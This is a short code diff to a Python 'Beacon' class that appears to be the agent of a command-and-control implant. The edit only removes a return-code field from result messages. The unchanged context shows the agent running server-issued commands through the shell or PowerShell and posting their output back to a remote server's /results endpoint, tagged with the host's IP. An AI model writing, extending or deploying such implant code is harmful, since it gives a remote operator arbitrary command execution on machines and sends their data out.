@@ -42,14 +42,14 @@ class Beacon:
                     ps = subprocess.run("powershell -c " + command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                 else:
                     ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
-                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
+                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout}
                 if self.debug:
                     print("Sending result back to server:",data)
                 req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/results", json=data)
             else:
-                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': "Undefined task action",'returncode': 9999}
+                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': "Undefined task action"}
         except subprocess.CalledProcessError as e:
-                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
+                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': e.stderr}
                 req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/results", json=data)
         except Exception as e:
             pass
